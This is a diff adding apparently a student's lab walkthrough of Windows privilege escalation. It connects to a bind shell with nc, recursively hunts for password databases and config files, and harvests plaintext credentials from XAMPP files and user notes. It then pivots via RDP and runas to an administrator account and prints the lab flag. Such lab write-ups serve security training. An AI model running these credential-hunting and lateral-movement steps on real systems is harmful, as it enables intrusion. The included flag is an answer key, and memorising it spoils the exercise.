@@ -1,0 +1,99 @@
+Questions 1
+Connect to the bind shell (port 4444) on CLIENTWK220 (VM #1) and follow the steps from this section. Find the flag on the desktop of backupadmin.
+
+nc 192.168.192.220 4444
+C:\Users\dave>powershell
+PS C:\Users\dave> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+# Show no password manager databases could be found in the search
+
+# Lets search for sensitive information in configuration files of xampp
+PS C:\Users\dave> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+
+
+
+Directory: C:\xampp
+Mode                 LastWriteTime         Length Name       
+-a----         3/13/2017   4:04 AM            824 passwords.txt 
+
+Directory: C:\xampp\mysql\bin
+Mode     LastWriteTime         Length Name
+-a----         6/22/2022  10:52 AM           5824 my.ini 
+
+PS C:\Users\dave> type C:\xampp\passwords.txt
+### XAMPP Default Passwords ###
+
+1) MySQL (phpMyAdmin):
+
+   User: root
+   Password:
+   (means no password!)
+
+2) FileZilla FTP:
+
+   [ You have to create a new user on the FileZilla Interface ] 
+
+3) Mercury (not in the USB & lite version): 
+
+   Postmaster: Postmaster (postmaster@localhost)
+   Administrator: Admin (admin@localhost)
+
+   User: newuser  
+   Password: wampp 
+
+4) WEBDAV: 
+
+   User: xampp-dav-unsecure
+   Password: ppmax2011
+   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
+   For activation please comment out the httpd-dav.conf and
+   following modules in the httpd.conf
+   
+   LoadModule dav_module modules/mod_dav.so
+   LoadModule dav_fs_module modules/mod_dav_fs.so  
+   
+   Please do not forget to refresh the WEBDAV authentification (users and passwords).
+
+PS C:\Users\dave> type C:\xampp\mysql\bin\my.ini
+
+
+PS C:\Users\dave> Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+
+Directory: C:\Users\dave\Desktop
+Mode   LastWriteTime  Length      Name      
+-a----         6/16/2022  11:28 AM            339 asdf.txt 
+PS C:\Users\dave> type Desktop\asdf.txt
+notes from meeting:
+
+- Contractors won't deliver the web app on time
+- Login will be done via local user credentials
+- I need to install XAMPP and a password manager on my machine 
+- When beta app is deployed on my local pc: 
+Steve (the guy with long shirt) gives us his password for testing
+password is: securityIsNotAnOption++++++
+
+# Heres show steve user is able to RDP
+PS C:\Users\dave> net user steve
+Local Group Memberships  *helpdesk *Remote Desktop Users 
+*Remote Management Use*Users 
+
+xfreerdp /u:steve /p:securityIsNotAnOption++++++ /v:192.168.192.220
+
+# Open powershell
+PS C:\Users\steve> type C:\xampp\mysql\bin\my.ini
+# The following options will be passed to all MySQL clients
+# backupadmin Windows password for backup job
+[client]
+password       = admin123admin123!
+port=3306
+socket="C:/xampp/mysql/mysql.sock"
+
+PS C:\Users\steve> net user backupadmin
+Local Group Memberships      *Administrators       *BackupUsers
+                             *Users
+
+# We can Runas the user
+PS C:\Users\steve> runas /user:backupadmin cmd
+C:\Users\Backupadmin\Desktop> Powershell
+PS C:\Users\Backupadmin\Desktop> type flag.txt
+OS{55c5a3971940b5d09263cb21a2243890}
+
